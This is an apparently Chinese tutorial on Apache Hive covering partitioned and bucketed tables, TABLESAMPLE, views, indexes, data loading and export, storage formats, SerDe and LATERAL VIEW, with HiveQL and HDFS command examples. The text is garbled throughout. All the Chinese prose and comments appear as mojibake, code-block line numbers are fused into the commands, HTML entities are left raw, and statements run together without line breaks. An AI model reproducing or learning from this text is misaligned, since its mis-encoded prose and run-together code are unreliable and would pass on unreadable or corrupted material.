bigint,have_invoice bigint)COMMENT 'æ³¨é‡Šï¼šXXX' #è¡¨æ³¨é‡Š PARTITIONED BY(pt STRING) #åˆ†åŒºè¡¨å­—æ®µï¼ˆå¦‚æœä½ æ–‡ä»¶éå¸¸ä¹‹å¤§çš„è¯ï¼Œé‡‡ç”¨åˆ†åŒºè¡¨å¯ä»¥å¿«è¿‡æ»¤å‡ºæŒ‰åˆ†åŒºå­—æ®µåˆ’åˆ†çš„æ•°æ®ï¼‰ ROW FORMAT DELIMITED FIELDS TERMINATED BY '\001' # å­—æ®µæ˜¯ç”¨ä»€ä¹ˆåˆ†å‰²å¼€çš„STORED AS SEQUENCEFILE; #ç”¨å“ªç§æ–¹å¼å­˜å‚¨æ•°æ®ï¼ŒSEQUENCEFILEæ˜¯hadoopè‡ªå¸¦çš„æ–‡ä»¶å‹ç¼©æ ¼å¼ 4.3.3 åˆ†åŒºè¡¨æ³¨æ„ç‚¹(é”™è¯¯ç‚¹) 1) åˆ†åŒºè¡¨åœ¨ load æ•°æ®çš„æ—¶å€™, å¾—æŒ‡å®šåˆ†åŒº, å¦åˆ™ä¼šæŠ¥é”™ 123456789101112# é”™è¯¯1: åˆ†åŒºè¡¨åœ¨ load æ•°æ®çš„æ—¶å€™, å¾—æŒ‡å®šåˆ†åŒºhive (mydb)&gt; load data local inpath '~/ihivedata/intdata' into table t6;FAILED: SemanticException [Error 10062]: Need to specify partition columns because the destination table is partitioned# é”™è¯¯2: å¯¼å…¥æœ¬åœ°æ•°æ®çš„æ—¶å€™, 'path'æ˜¯ä»å½“å‰æ‰€åœ¨è·¯å¾„å¼€å§‹çš„hive (mydb)&gt; load data local inpath '~/ihivedata/intdata' into table t6 partition(class='job1');FAILED: SemanticException Line 1:23 Invalid path ''&lt;sub&gt;/ihivedata/intdata'': No files matching path file:/home/ap/&lt;/sub&gt;/ihivedata/intdata# è¿™é‡Œå°±æ­£ç¡®äº†hive (mydb)&gt; load data local inpath 'ihivedata/intdata' into table t6 partition(class='job1');Loading data to table mydb.t6 partition (class=job1)OK æœ¬è´¨åŸå› : åˆ†åŒºè¡¨çš„åˆ†åŒº, å°±æ˜¯åœ¨ hdfs ä¸Š, åŸè¡¨çš„æ–‡ä»¶å¤¹ä¸‹é¢åˆ›å»ºäº†ä¸€ä¸ªå­æ–‡ä»¶å¤¹, æ–‡ä»¶å¤¹åå°±æ˜¯åˆ†åŒºå. ä»æœ¬åœ° load æ•°æ®: hive (mydb)&gt; load data local inpath &#39;ihivedata/intdata&#39; into table t6 partition(class=&#39;job1&#39;); load æ•°æ®æŒ‡å®šåˆ†åŒºä¹‹å, ä¼šç›´æ¥ load åˆ°æ•°æ®æ–‡ä»¶å¤¹é‡Œé¢ 2) æ²¡æœ‰æ·»åŠ åˆ†åŒºæ—¶, ç›´æ¥å¾€ä¸å­˜åœ¨çš„åˆ†åŒºå¯¼å…¥æ•°æ®, åˆ†åŒºä¼šè‡ªåŠ¨åˆ›å»º 12# ç›´æ¥å¾€ä¸å­˜åœ¨çš„åˆ†åŒºloadæ•°æ®, åˆ†åŒºä¼šè‡ªåŠ¨åˆ›å»ºload data local inpath 'ihivedata/intdata' into table t6 partition(class='job110'); 3) æ‰‹åŠ¨åœ¨è¡¨ä¸­åˆ›å»ºåˆ†åŒº(æ–‡ä»¶å¤¹), å¹¶ç›´æ¥å‘æ­¤æ–‡ä»¶å¤¹ä¸­å¯¼å…¥æ•°æ® 12345678910111213141516171819202122232425262728293031323334353637# ç›´æ¥åˆ›å»ºç›®å½•hive (mydb)&gt; dfs -mkdir /user/hive/warehouse/mydb.db/t6/class=job120;# ç›´æ¥ä» hadoop ç«¯ä¼ æ•°æ®hadoop fs -put ihivedata/intdata /user/hive/warehouse/mydb.db/t6/class=job120# æ­¤æ—¶å† show partitions t6; ä¼šå‘ç°å¹¶æ²¡æœ‰æ­¤åˆ†åŒº---partitionclass=job1class=job110class=job2class=job3class=job4# æ­¤æ—¶å°±éœ€è¦æ‰‹åŠ¨'æ¿€æ´»'æ­¤åˆ†åŒº, åŠ å…¥äº†å°±æœ‰äº†hive (mydb)&gt; alter table t6 add partition(class='job120');---hive (mydb)&gt; show partitions t6;---partitionclass=job1class=job110class=job120class=job2class=job3class=job4# æŸ¥çœ‹åˆ†åŒºä¿¡æ¯hive (mydb)&gt; select * from t6 where class='job110';OKt6.id t6.class1 job1102 job1103 job1104 job1105 job110 4.3.4 å¤åˆåˆ†åŒºåŸºæœ¬æ“ä½œ åˆ›å»ºæ•°æ®æ–‡ä»¶partition_table.dat åˆ›å»ºè¡¨ create table t7(name string,age int)partitioned by(class string,city string)row format delimited fields terminated by &#39;\t&#39; stored as TEXTFILE; åœ¨ Hive ä¸‹åŠ è½½æ•°æ®åˆ°åˆ†åŒº load data local inpath &#39;ihivedata/partidata&#39; into table t7 partition(class=&#39;job1&#39;,city=&#39;beijing&#39;); load data local inpath &#39;ihivedata/partidata&#39; into table t7 partition(class=&#39;job1&#39;,city=&#39;shanghai&#39;); load data local inpath &#39;ihivedata/partidata&#39; into table t7 partition(class=&#39;job2&#39;,city=&#39;ss&#39;); æ³¨æ„: å¤šçº§åˆ†åŒºå…¶å®å°±æ˜¯å¤šçº§ç›®å½• è¶Šé è¿‘å·¦è¾¹, ç›®å½•å±‚çº§è¶Šé«˜; è¶Šé è¿‘å³è¾¹, ç›®å½•å±‚çº§è¶Šä½; load æ•°æ®åˆ°å¤šçº§åˆ†åŒº, loadå±‚çº§å¿…é¡»å’Œæ•´ä¸ªå±‚çº§æ•°é‡ç›¸åŒ ä¹Ÿå°±æ˜¯è¯´, å¦‚æœåˆ†åŒºæœ‰2å±‚, ä¼ æ•°æ®çš„æ—¶å€™, ä¹Ÿå¿…é¡»ä¼ 2å±‚åˆ†åŒº, å¹¶ä¸”å±‚çº§é¡ºåºå¿…é¡»ä¸€è‡´ ä»Linux æœ¬åœ°ç›´æ¥å¯¼æ•°æ®åˆ°åˆ†åŒº å¯ä»¥ç›´æ¥åœ¨ hadoop UI é¡µé¢, æŸ¥çœ‹è·¯å¾„, ç„¶åç›´æ¥ä¼ åˆ°æ­¤è·¯å¾„ä¸­ hadoop fs -put ihivedata/partidata /user/hive/warehouse/mydb.db/t7/class=job1/city=beijing/p2 æŸ¥çœ‹æ•°æ® select * from partition_table select count(*) from partition_table åˆ é™¤è¡¨ drop table partition_table å·¥ä½œä¸­ ç”¨çš„æœ€å¤šçš„æ˜¯ å¤–éƒ¨è¡¨ + åˆ†åŒºè¡¨ 4.4 æ¡¶è¡¨ - ä¸»è¦ç”¨äºæŠ½æ ·æŸ¥è¯¢æ¡¶è¡¨çš„åŸºæœ¬æ“ä½œ åˆ›å»ºæ¡¶è¡¨å®Œæ•´è¿‡ç¨‹ 12345678910111213141516171819202122232425262728#åˆ›å»ºåˆ†æ¡¶è¡¨drop table stu_buck;create table stu_buck(Sno int,Sname string,Sex string,Sage int,Sdept string)clustered by(Sno) sorted by(Sno DESC)into 4 bucketsrow format delimitedfields terminated by ',';#è®¾ç½®å˜é‡,è®¾ç½®åˆ†æ¡¶ä¸ºtrue, è®¾ç½®reduceæ•°é‡æ˜¯åˆ†æ¡¶çš„æ•°é‡ä¸ªæ•°set hive.enforce.bucketing = true;set mapreduce.job.reduces=4;#å¼€å§‹å¾€åˆ›å»ºçš„åˆ†é€šè¡¨æ’å…¥æ•°æ®(æ’å…¥æ•°æ®éœ€è¦æ˜¯å·²åˆ†æ¡¶, ä¸”æ’åºçš„)#å¯ä»¥ä½¿ç”¨distribute by(sno) sort by(sno asc) æˆ–æ˜¯æ’åºå’Œåˆ†æ¡¶çš„å­—æ®µç›¸åŒçš„æ—¶å€™ä½¿ç”¨Cluster by(å­—æ®µ)#æ³¨æ„ä½¿ç”¨cluster by å°±ç­‰åŒäºåˆ†æ¡¶+æ’åº(sort)insert into table stu_buckselect Sno,Sname,Sex,Sage,Sdept from student distribute by(Sno) sort by(Sno asc);insert overwrite table stu_buckselect * from student distribute by(Sno) sort by(Sno asc);insert overwrite table stu_buckselect * from student cluster by(Sno);-----ä»¥ä¸Š3è€…æ•ˆæœä¸€æ ·çš„ ä¿å­˜selectæŸ¥è¯¢ç»“æœçš„å‡ ç§æ–¹å¼ï¼š å°†æŸ¥è¯¢ç»“æœä¿å­˜åˆ°ä¸€å¼ æ–°çš„hiveè¡¨ä¸­ 123create table t_tmpasselect * from t_p; å°†æŸ¥è¯¢ç»“æœä¿å­˜åˆ°ä¸€å¼ å·²ç»å­˜åœ¨çš„hiveè¡¨ä¸­ 12insert into table t_tmpselect * from t_p; å°†æŸ¥è¯¢ç»“æœä¿å­˜åˆ°æŒ‡å®šçš„æ–‡ä»¶ç›®å½•ï¼ˆå¯ä»¥æ˜¯æœ¬åœ°ï¼Œä¹Ÿå¯ä»¥æ˜¯hdfsï¼‰ 12345insert overwrite local directory '/home/hadoop/test'select * from t_p;insert overwrite directory '/aaa/test'select * from t_p; æ•°æ®åŠ è½½åˆ°æ¡¶è¡¨æ—¶ï¼Œä¼šå¯¹å­—æ®µå–hashå€¼ï¼Œç„¶åä¸æ¡¶çš„æ•°é‡å–æ¨¡ã€‚æŠŠæ•°æ®æ”¾åˆ°å¯¹åº”çš„æ–‡ä»¶ä¸­ã€‚ æ‰€ä»¥é¡ºåºæ˜¯æ‰“ä¹±çš„, ä¸æ˜¯åŸå§‹ t1çš„æ•°æ®é¡ºåº æŸ¥çœ‹æ•°æ® å¯ä»¥ç›´æ¥select * æŸ¥çœ‹å…¨éƒ¨ ä¹Ÿå¯ä»¥ç›´æ¥å•ç‹¬æŸ¥çœ‹æ¯ä¸ªæ¡¶çš„æ•°æ® 123456789hive (mydb)&gt; dfs -cat /user/hive/warehouse/mydb.db/bucket_table/000000_0;4hive (mydb)&gt; dfs -cat /user/hive/warehouse/mydb.db/bucket_table/000001_0;51hive (mydb)&gt; dfs -cat /user/hive/warehouse/mydb.db/bucket_table/000002_0;2hive (mydb)&gt; dfs -cat /user/hive/warehouse/mydb.db/bucket_table/000003_0;3 ä¿®æ”¹æ¡¶çš„ä¸ªæ•° alter table bucket_table clustered by (id) sorted by(id) into 10 buckets; ä½†æ˜¯è¿™æ ·ä¿®æ”¹ä¹‹å, ç”Ÿæˆçš„æ˜¯åŸæ¥çš„ copy, å¹¶ä¸”é‡Œé¢çš„æ•°æ®ä¹Ÿå¾ˆå¥‡æ€ª, ä¸çŸ¥é“æ˜¯æŒ‰ç…§ä»€ä¹ˆæ¥æ‰§è¡Œçš„? :TODO æ³¨æ„ï¼š ç‰©ç†ä¸Šï¼Œæ¯ä¸ªæ¡¶å°±æ˜¯è¡¨(æˆ–åˆ†åŒºï¼‰ç›®å½•é‡Œçš„ä¸€ä¸ªæ–‡ä»¶ ä¸€ä¸ªä½œä¸šäº§ç”Ÿçš„æ¡¶(è¾“å‡ºæ–‡ä»¶)å’Œreduceä»»åŠ¡ä¸ªæ•°ç›¸åŒ æ¡¶è¡¨å·¥ä½œä¸­å®¹æ˜“é‡åˆ°çš„é”™è¯¯ å‘æ¡¶è¡¨ä¸­æ’å…¥å…¶å®ƒè¡¨æŸ¥å‡ºçš„æ•°æ®çš„æ—¶å€™, å¿…é¡»æŒ‡å®šå­—æ®µå, å¦åˆ™ä¼šæŠ¥å­—æ®µä¸åŒ¹é…. 1234FAILED: SemanticException [Error 10044]: Line 1:12 Cannot insert into target table because column number/types are different 'bucket_table': Table insclause-0 has 1 columns, but query has 2 columns.# åº”è¯¥æ˜¯è¿™æ ·insert into bucket_table select id from t6; â€» æ¡¶è¡¨çš„æŠ½æ ·æŸ¥è¯¢ æ¡¶è¡¨çš„æŠ½æ ·æŸ¥è¯¢ select * from bucket_table tablesample(bucket 1 out of 4 on id); tablesampleæ˜¯æŠ½æ ·è¯­å¥ è¯­æ³•è§£æï¼šTABLESAMPLE(BUCKET x OUT OF y) yå¿…é¡»æ˜¯tableæ€»bucketæ•°çš„å€æ•°æˆ–è€…å› å­ã€‚ hiveæ ¹æ®yçš„å¤§å°ï¼Œå†³å®šæŠ½æ ·çš„æ¯”ä¾‹ã€‚ ä¾‹å¦‚ï¼Œtableæ€»å…±åˆ†äº†64ä»½ï¼Œå½“y=32æ—¶ï¼ŒæŠ½å–(64/32=)2ä¸ªbucketçš„æ•°æ®ï¼Œå½“y=128æ—¶ï¼ŒæŠ½å–(64/128=)1/2ä¸ªbucketçš„æ•°æ®ã€‚xè¡¨ç¤ºä»å“ªä¸ªbucketå¼€å§‹æŠ½å–ã€‚ ä¾‹å¦‚ï¼Œtableæ€»bucketæ•°ä¸º32ï¼Œtablesample(bucket 3 out of 16)ï¼Œè¡¨ç¤ºæ€»å…±æŠ½å–ï¼ˆ32/16=ï¼‰2ä¸ªbucketçš„æ•°æ®ï¼Œåˆ†åˆ«ä¸ºç¬¬3ä¸ªbucketå’Œç¬¬ï¼ˆ3+16=ï¼‰19ä¸ªbucketçš„æ•°æ®ã€‚ 5. Hive è§†å›¾çš„æ“ä½œ ä½¿ç”¨è§†å›¾å¯ä»¥é™ä½æŸ¥è¯¢çš„å¤æ‚åº¦ è§†å›¾çš„åˆ›å»º create view v1 AS select t1.name from t1; è§†å›¾çš„åˆ é™¤ drop view if exists v1; 6. Hive ç´¢å¼•çš„æ“ä½œ åˆ›å»ºç´¢å¼• create index t1_index on table t1(id) as &#39;org.apache.hadoop.hive.ql.index.compact.CompactIndexHandler&#39; with deferred rebuild in table t1_index_table; t1_index: ç´¢å¼•åç§° as: æŒ‡å®šç´¢å¼•å™¨ t1_index_table: è¦åˆ›å»ºçš„ç´¢å¼•è¡¨ æ˜¾ç¤ºç´¢å¼• show formatted index on t1; é‡å»ºç´¢å¼• alter index t1_index on t1 rebuild; é‡å»ºå®Œç´¢å¼•ä¹‹å, æŸ¥çœ‹ t1_index_table è¿™å¼ è¡¨, å°±å­˜äº†t1è¡¨æ–‡ä»¶å…·ä½“çš„ä½ç½®, æœ€åä¸€åˆ—t1_index_table._offsetsæ˜¯ ç´¢å¼•çš„åç§»é‡, ç±»ä¼¼äºæŒ‡é’ˆ, åç§»é‡æ˜¯ç´¢å¼•çš„ç²¾é«“ 12345678hive (mydb)&gt; select * from t1_index_table;OKt1_index_table.id t1_index_table._bucketname t1_index_table._offsets1 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [0]2 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [2]3 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [4]4 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [6]5 hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1/intdata [8] åˆ†åŒºå­—æ®µæœ¬è´¨ä¸Šå…¶å®å°±æ˜¯ç´¢å¼• 7. è£…è½½æ•°æ®7.1 æ™®é€šè£…è½½æ•°æ®: ä»æœ¬åœ° put ä» hive cp ä»æ–‡ä»¶ä¸­è£…è½½æ•°æ® 1hive&gt;LOAD DATA [LOCAL] INPATH '...' [OVERWRITE] INTO TABLE t2 [PARTITION (province='beijing')]; é€šè¿‡æŸ¥è¯¢è¡¨è£…è½½æ•°æ® 12345678910111213141516# æ–¹å¼1hive&gt;INSERT OVERWRITE TABLE t2 PARTITION (province='beijing') SELECT * FROM xxx WHERE xxx;# æ–¹å¼2hive&gt;FROM t4 INSERT OVERWRITE TABLE t3 PARTITION (...) SELECT ...WHERE... INSERT OVERWRITE TABLE t3 PARTITION (...) SELECT ...WHERE... INSERT OVERWRITE TABLE t3 PARTITION (...) SELECT ...WHERE...; # æ–¹å¼3 ç›´æ¥æ’å…¥æ•°æ®, ä¹Ÿä¼šè½¬åŒ–ä¸ºæ–‡ä»¶çš„å½¢å¼, å­˜åœ¨è¡¨çš„ç›®å½•ä¸‹- insert into table_name values(xxx); # æ–¹å¼4 ç›´æ¥ä¼ æ–‡ä»¶ - load data (local) inpath â€˜ xxxâ€™ into table t_1; 7.2åŠ¨æ€è£…è½½æ•°æ® ä¸å¼€å¯åŠ¨æ€è£…è½½æ—¶ 12hive&gt;INSERT OVERWRITE TABLE t3 PARTITION(province='bj', city='bj') SELECT t.province, t.city FROM temp t WHERE t.province='bj'; å¼€å¯åŠ¨æ€åˆ†åŒºæ”¯æŒ 123hive&gt;set hive.exec.dynamic.partition=true;hive&gt;set hive.exec.dynamic.partition.mode=nostrict;hive&gt;set hive.exec.max.dynamic.partitions.pernode=1000; æŠŠ t6 è¡¨çš„æ‰€æœ‰çš„å­—æ®µ (åŒ…æ‹¬åˆ†åŒºå­—æ®µ) åŠ è½½è¿› t9 å¯¹åº”çš„åˆ†åŒº 1hive (mydb)&gt; insert overwrite table t9 partition(class) select id,class from t6; å•è¯­å¥å»ºè¡¨å¹¶åŒæ—¶è£…è½½æ•°æ® 1hive&gt;CREATE TABLE t4 AS SELECT .... 8. å¯¼å‡ºæ•°æ® åœ¨hdfsä¹‹é—´å¤åˆ¶æ–‡ä»¶(å¤¹) hadoop fs -cp source destination hive&gt; dfs -cp source destination æ¡ˆä¾‹: hive&gt; dfs -get /user/hive/warehouse/mydb.db/t9 /root/t9; ä» hdfs å¤åˆ¶åˆ°æœ¬åœ° ä½¿ç”¨DIRECTORY hive&gt;INSERT OVERWRITE ã€LOCALã€‘ DIRECTORY &#39;...&#39; SELECT ...FROM...WHERE ...; æ¡ˆä¾‹:é€šè¿‡æŸ¥è¯¢å¯¼å‡ºåˆ° t9, èµ°çš„ MapReduce å¯¼åˆ°åˆ° hdfs: insert overwrite directory &quot;/home/t9&quot; select * from t9; å¯¼å‡ºåˆ°æœ¬åœ°: insert overwrite local directory &quot;/home/ap/t9&quot; select * from t9; 9. è¯»æ¨¡å¼&amp;å†™æ¨¡å¼ RDBMSæ˜¯å†™æ¨¡å¼ Hiveæ˜¯è¯»æ¨¡å¼ 10. å®Œæ•´å»ºè¡¨è¯­å¥è¯­æ³•12345678910111213CREATE [EXTERNAL] TABLE [IF NOT EXISTS] [db_name.]table_name [(col_name data_type [COMMENT col_comment], ...)] [COMMENT table_comment] [PARTITIONED BY (col_name data_type [COMMENT col_comment], ...)] [CLUSTERED BY (col_name, col_name, ...) [SORTED BY (col_name [ASC|DESC], ...)] INTO num_buckets BUCKETS] [SKEWED BY (col_name, col_name, ...) ON ([(col_value, col_value, ...), ...|col_value, col_value, ...]) [STORED AS DIRECTORIES] ] [ [ROW FORMAT row_format] [STORED AS file_format] | STORED BY 'storage.handler.class.name' [WITH SERDEPROPERTIES (...)] ] [LOCATION hdfs_path] [TBLPROPERTIES (property_name=property_value, ...)] [AS select_statement] (Note: not supported when creating external tables.) 11. æ–‡ä»¶æ ¼å¼ TextFile SequenceFile RCFile ORC 11.1 é»˜è®¤å­˜å‚¨æ ¼å¼å°±æ˜¯ TextFile å­˜å‚¨ç©ºé—´æ¶ˆè€—æ¯”è¾ƒå¤§ï¼Œ å¹¶ä¸”å‹ç¼©çš„text æ— æ³•åˆ†å‰²å’Œåˆå¹¶ æŸ¥è¯¢çš„æ•ˆç‡æœ€ä½,å¯ä»¥ç›´æ¥å­˜å‚¨ï¼Œ åŠ è½½æ•°æ®çš„é€Ÿåº¦æœ€é«˜ 11.2 ä½¿ç”¨SequenceFileå­˜å‚¨ å­˜å‚¨ç©ºé—´æ¶ˆè€—å¤§ å‹ç¼©çš„æ–‡ä»¶å¯ä»¥åˆ†å‰²å’Œåˆå¹¶ æŸ¥è¯¢æ•ˆç‡é«˜ éœ€è¦é€šè¿‡textæ–‡ä»¶è½¬åŒ–æ¥åŠ è½½ 12345678910111213hive&gt; create table test2(str STRING) STORED AS SEQUENCEFILE; set hive.exec.compress.output=true;set mapred.output.compress=true;set mapred.output.compression.codec=com.hadoop.compression.lzo.LzoCodec;set io.seqfile.compression.type=BLOCK;set io.compression.codecs=com.hadoop.compression.lzo.LzoCodec;INSERT OVERWRITE TABLE test2 SELECT * FROM test1; æ³¨æ„ç‚¹: SequenceFile ç±»å‹çš„è¡¨, ä¸èƒ½ç›´æ¥å¯¼å…¥æ•°æ®æ–‡ä»¶, åªèƒ½é€šè¿‡ä»ä»–è¡¨æŸ¥è¯¢ insert overwrite table t2 select * from t1; 123# æŸ¥çœ‹æ­¤ 'SequenceFile' è¡¨hive (db2)&gt; dfs -cat /user/hive/warehouse/db2.db/t2/000000_0 ;SEQ"org.apache.hadoop.io.BytesWritableorg.apache.hadoop.io.Text*org.apache.hadoop.io.compress.DefaultCodecï¿½ï¿½ï¿½/*&lt;bbï¿½mï¿½?xï¿½c453xï¿½c464xï¿½c475xï¿½c486xï¿½c497hive (db2)&gt; 11.3 ä½¿ç”¨RCFileå­˜å‚¨RCFILEæ˜¯ä¸€ç§è¡Œåˆ—å­˜å‚¨ç›¸ç»“åˆçš„å­˜å‚¨æ–¹å¼ã€‚é¦–å…ˆï¼Œå…¶å°†æ•°æ®æŒ‰è¡Œåˆ†å—ï¼Œä¿è¯åŒä¸€ä¸ªrecordåœ¨ä¸€ä¸ªå—ä¸Šï¼Œé¿å…è¯»ä¸€ä¸ªè®°å½•éœ€è¦è¯»å–å¤šä¸ªblockã€‚å…¶æ¬¡ï¼Œå—æ•°æ®åˆ—å¼å­˜å‚¨ï¼Œæœ‰åˆ©äºæ•°æ®å‹ç¼©å’Œå¿«é€Ÿçš„åˆ—å­˜å–ã€‚ rcfile å­˜å‚¨ç©ºé—´æœ€å° æŸ¥è¯¢çš„æ•ˆç‡æœ€é«˜ éœ€è¦é€šè¿‡textæ–‡ä»¶è½¬åŒ–æ¥åŠ è½½ åŠ è½½çš„é€Ÿåº¦æœ€ä½ 123456789101112hive&gt; create table test3(str STRING) STORED AS RCFILE; set hive.exec.compress.output=true;set mapred.output.compress=true;set mapred.output.compression.codec=com.hadoop.compression.lzo.LzoCodec;set io.compression.codecs=com.hadoop.compression.lzo.LzoCodec;INSERT OVERWRITE TABLE test3 SELECT * FROM test1; æ³¨æ„ç‚¹: RCFile ä¹Ÿåªèƒ½ä»å…¶å®ƒè¡¨å¯¼å…¥æ•°æ® 12hive (db2)&gt; dfs -cat /user/hive/warehouse/db2.db/t3/000000_0;RCF*org.apache.hadoop.io.compress.DefaultCodechive.io.rcfile.column.number1 11.4 ä½¿ç”¨ORCå­˜å‚¨(æœ€å¥½çš„ä¸€ç§æ ¼å¼)æ˜¯ä¸€ç§é’ˆå¯¹ RCFile ä¼˜åŒ–çš„æ ¼å¼ ä¸»è¦ç‰¹ç‚¹: å‹ç¼©, ç´¢å¼•, å•æ–‡ä»¶è¾“å‡º 12345678910111213hive&gt; create table t1_orc(id int, name string) row format delimited fields terminated by '\t' stored as orc tblproperties("orc.compress"="ZLIB");ALTER TABLE ... [PARTITION partition_spec] SET FILEFORMAT ORC;# ä¹Ÿå¯ä»¥æ”¹ä¸ºå…¶å®ƒçš„, ä¿®æ”¹çš„è¯­æ³•å°±æ˜¯è¿™æ ·alter table t1 set fileformat textfile;SET hive.default.fileformat=Orc;insert overwrite table t1_orc select * from t1; æ³¨æ„ç‚¹: ORC ä¹Ÿåªèƒ½ä»å…¶å®ƒè¡¨å¯¼å…¥æ•°æ® å ç”¨ç©ºé—´å¤§, ä¸€ä¸ª block æœ‰256M, ä¹‹å‰2ç§éƒ½æ˜¯128M 1234567891011hive (db2)&gt; dfs -cat /user/hive/warehouse/db2.db/t4/000000_0;ORCP+P ï¿½6ï¿½bï¿½``ï¿½ï¿½ï¿½ÑŒ@ï¿½Hï¿½ 1q01-PPK# (" id0P:P@ï¿½;ï¿½ï¿½" (0ï¿½ï¿½ORChive 12. åºåˆ—åŒ– &amp; ååºåˆ—åŒ– (Hive SerDe)12.1 SerDe What is a SerDe? SerDe æ˜¯ â€œSerializer and Deserializer.â€çš„ç¼©å†™ Hive ä½¿ç”¨ SerDeå’ŒFileFormatè¿›è¡Œè¡Œå†…å®¹çš„è¯»å†™. Hiveåºåˆ—åŒ–æµç¨‹ ä» HDFS ä¸Šè¯»å…¥æ–‡ä»¶ (ååºåˆ—åŒ–) HDFSæ–‡ä»¶ --&gt; InputFileFormat --&gt; &lt;key, value&gt; --&gt; Deserializer --&gt; è¡Œå¯¹è±¡ å†™å‡ºåˆ° HDFS (åºåˆ—åŒ–) è¡Œå¯¹è±¡ --&gt; Serializer --&gt; &lt;key, value&gt; --&gt; OutputFileFormat --&gt; HDFSæ–‡ä»¶ æ³¨æ„: æ•°æ®å…¨éƒ¨å­˜åœ¨åœ¨valueä¸­ï¼Œkeyå†…å®¹æ— æ„ä¹‰ Hive ä½¿ç”¨å¦‚ä¸‹FileFormat ç±»è¯»å†™ HDFS files: TextInputFormat/HiveIgnoreKeyTextOutputFormat: è¯»å†™æ™®é€šHDFSæ–‡æœ¬æ–‡ä»¶. SequenceFileInputFormat/SequenceFileOutputFormat: è¯»å†™SequenceFileæ ¼å¼çš„HDFSæ–‡ä»¶ â€¦. Hive ä½¿ç”¨å¦‚ä¸‹SerDe ç±»(å)åºåˆ—åŒ–æ•°æ®: MetadataTypedColumnsetSerDe: è¯»å†™csvã€tsvæ–‡ä»¶å’Œé»˜è®¤æ ¼å¼æ–‡ä»¶ ThriftSerDe: è¯»å†™Thrift åºåˆ—åŒ–åçš„å¯¹è±¡. DynamicSerDe: è¯»å†™Thriftåºåˆ—åŒ–åçš„å¯¹è±¡, ä¸è¿‡ä¸éœ€è¦è§£è¯»schemaä¸­çš„ddl. 12.2 ä½¿ç”¨CSV SerdeCSVæ ¼å¼çš„æ–‡ä»¶ä¹Ÿç§°ä¸ºé€—å·åˆ†éš”å€¼ï¼ˆComma-Separated Valuesï¼ŒCSVï¼Œæœ‰æ—¶ä¹Ÿç§°ä¸ºå­—ç¬¦åˆ†éš”å€¼ï¼Œå› ä¸ºåˆ†éš”å­—ç¬¦ä¹Ÿå¯ä»¥ä¸æ˜¯é€—å·ã€‚åœ¨æœ¬æ–‡ä¸­çš„CSVæ ¼å¼çš„æ•°æ®å°±ä¸æ˜¯ç®€å•çš„é€—å·åˆ†å‰²çš„ï¼‰ï¼Œå…¶æ–‡ä»¶ä»¥çº¯æ–‡æœ¬å½¢å¼å­˜å‚¨è¡¨æ ¼æ•°æ®ï¼ˆæ•°å­—å’Œæ–‡æœ¬ï¼‰ã€‚CSVæ–‡ä»¶ç”±ä»»æ„æ•°ç›®çš„è®°å½•ç»„æˆï¼Œè®°å½•é—´ä»¥æŸç§æ¢è¡Œç¬¦åˆ†éš”ï¼›æ¯æ¡è®°å½•ç”±å­—æ®µç»„æˆï¼Œå­—æ®µé—´çš„åˆ†éš”ç¬¦æ˜¯å…¶å®ƒå­—ç¬¦æˆ–å­—ç¬¦ä¸²ï¼Œæœ€å¸¸è§çš„æ˜¯é€—å·æˆ–åˆ¶è¡¨ç¬¦ã€‚é€šå¸¸ï¼Œæ‰€æœ‰è®°å½•éƒ½æœ‰å®Œå…¨ç›¸åŒçš„å­—æ®µåºåˆ—ã€‚é»˜è®¤çš„åˆ†éš”ç¬¦æ˜¯ DEFAULT_ESCAPE_CHARACTER \DEFAULT_QUOTE_CHARACTER â€œ â€”å¦‚æœæ²¡æœ‰ï¼Œåˆ™ä¸éœ€è¦æŒ‡å®šDEFAULT_SEPARATOR , 12345678CREATE TABLE csv_table(a string, b string) ROW FORMAT SERDE 'org.apache.hadoop.hive.serde2.OpenCSVSerde' WITH SERDEPROPERTIES ("separatorChar"="\t", "quoteChar"="'", "escapeChar"="\\") STORED AS TEXTFILE;# separatorCharï¼šåˆ†éš”ç¬¦# quoteCharï¼šå¼•å·ç¬¦# escapeCharï¼šè½¬ä¹‰ç¬¦&gt;&gt; :TODO åˆ›å»ºè¡¨æ²¡æˆåŠŸ, ç”¨åˆ°æ—¶å†è¯´ 13. Lateral View è¯­æ³•lateral viewç”¨äºå’Œsplit, explodeç­‰UDTFä¸€èµ·ä½¿ç”¨ï¼Œå®ƒèƒ½å¤Ÿå°†ä¸€è¡Œæ•°æ®æ‹†æˆå¤šè¡Œæ•°æ®ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå¯ä»¥å¯¹æ‹†åˆ†åçš„æ•°æ®è¿›è¡Œèšåˆã€‚lateral viewé¦–å…ˆä¸ºåŸå§‹è¡¨çš„æ¯è¡Œè°ƒç”¨UDTFï¼ŒUTDFä¼šæŠŠä¸€è¡Œæ‹†åˆ†æˆä¸€æˆ–è€…å¤šè¡Œï¼Œlateral viewå†æŠŠç»“æœç»„åˆï¼Œäº§ç”Ÿä¸€ä¸ªæ”¯æŒåˆ«åè¡¨çš„è™šæ‹Ÿè¡¨ã€‚ lateral: ä¾§é¢, æ¨ªåˆ‡é¢ Lateral View: åˆ‡é¢è¡¨ åˆ›å»ºè¡¨ create table t8(name string,nums array\&lt;int>)row format delimited fields terminated by â€œ\tâ€ COLLECTION ITEMS TERMINATED BY â€˜:â€™; æ•°æ®åˆ‡å‰² SELECT name,new_num FROM t8 LATERAL VIEW explode(nums) num AS new_num; select name,id from class_test lateral view explode(student_id_list) list as id; æ³¨æ„: as å‰é¢çš„ list è²Œä¼¼æ˜¯å¯ä»¥éšè¡¨èµ·åçš„ æ•ˆæœæ¼”ç¤º 12345678910111213141516171819202122hive (default)&gt; select * from class_test;OKclass_test.name class_test.student_id_listzhangsan [24,25,27,37]lisi [28,39,23,43]wangwu [25,23,2,54]---hive (default)&gt; select name,id from class_test lateral view explode(student_id_list) list as id;OKname idzhangsan 24zhangsan 25zhangsan 27zhangsan 37lisi 28lisi 39lisi 23lisi 43wangwu 25wangwu 23wangwu 2wangwu 54 14. Hiveçš„é«˜çº§å‡½æ•°14.1 ç®€ä»‹ ç®€å•æŸ¥è¯¢ select â€¦ fromâ€¦whereâ€¦ ä½¿ç”¨å„ç§å‡½æ•° hive&gt;show functions; 